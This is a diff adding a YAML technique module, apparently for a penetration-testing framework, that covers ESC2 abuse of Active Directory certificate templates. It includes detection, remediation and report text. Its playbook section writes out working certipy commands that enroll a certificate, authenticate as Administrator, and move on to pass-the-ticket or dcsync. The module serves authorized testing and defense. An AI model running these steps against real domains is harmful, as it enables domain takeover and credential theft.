@@ -1,0 +1,63 @@
+# ESC2 — ADCS template with Any Purpose EKU (or no EKU) → domain compromise
+#
+# A certificate template configured with the Any Purpose EKU
+# (2.5.29.37.0) or no EKU at all + enrollable by low-priv users
+# lets an attacker enroll a cert usable as any principal in any
+# context — client-auth (login), server-auth (impersonate a
+# service), code-signing (sign a payload), whatever. Same
+# exploitation flow as ESC1 but no SAN spoofing needed —
+# the cert is intrinsically usable as any principal.
+#
+# Detection: `certipy find -vulnerable` flags "ESC2".
+# Fix: remove the Any Purpose EKU, replace with the specific
+# EKUs the template's use-case actually needs.
+technique: T1649
+name: ESC2 — ADCS Any-Purpose-EKU template abuse
+tactic: [privilege-escalation, credential-access]
+platform: [windows]
+key: 'adcs:esc2'
+family: adcs
+ranking:
+  exploitability: high
+  safety: config-change
+  detection: quiet
+detect:
+  version_range:
+    services.adcs: ">=1.0"
+execute:
+  command: |-
+    certipy find -vulnerable -u '<user>@<domain>' -p '<pass>' -dc-ip <dc> 2>&1 | grep -A 5 ESC2 || echo "no ADCS template flagged ESC2 — see playbook"
+verify:
+  success: "ESC2"
+cleanup:
+  command: ""
+report:
+  vector_type: cert_template_esc2
+  evidence: "template {{template}} enrollable by low-priv + Any Purpose EKU"
+  description: >
+    Any AD user (or low-priv group with template enrollment
+    rights) can enroll a certificate against a template with
+    the Any Purpose EKU or no EKU at all — the resulting cert
+    is intrinsically usable as any principal in any context,
+    including domain admin. Discovered via certipy find
+    -vulnerable's ESC2 output.
+  remediation: >
+    Remove the Any Purpose EKU (2.5.29.37.0) from the flagged
+    template + replace with the specific EKUs the template's
+    use-case actually requires. Restrict enrollment ACLs to
+    the accounts that legitimately need the cert. Audit issued
+    certs from the CA for the flagged template since the last
+    known-good baseline.
+  refs: [T1649, ESC2, certipy]
+playbook:
+  summary: >
+    ADCS template with Any Purpose EKU + broad enrollment →
+    enroll → use as any principal.
+  place: 'attacker-side (SpecterOps Certified Pre-Owned + certipy)'
+  steps:
+    - "confirm: `certipy find -vulnerable -u '<user>@<domain>' -p '<pass>' -dc-ip <dc>` — look for the ESC2 section listing the vulnerable template"
+    - "enroll: `certipy req -u '<user>@<domain>' -p '<pass>' -ca '<CA>' -template '<template>'` — writes user.pfx"
+    - "authenticate as any principal: `certipy auth -pfx user.pfx -username Administrator -domain corp.local -dc-ip <dc>` — returns TGT for Administrator"
+    - "loot: use the TGT for pass-the-ticket (impacket-psexec, wmiexec, etc.) or dcsync"
+    - "CLEANUP: the enrolled cert lives in the CA's issued-certs database + on disk. Revoke via `certipy ca -revoke <serial>` post-engagement."
+  restore: "certipy ca -revoke <serial> -u '<user>@<domain>' -p '<pass>' -ca '<CA>'"
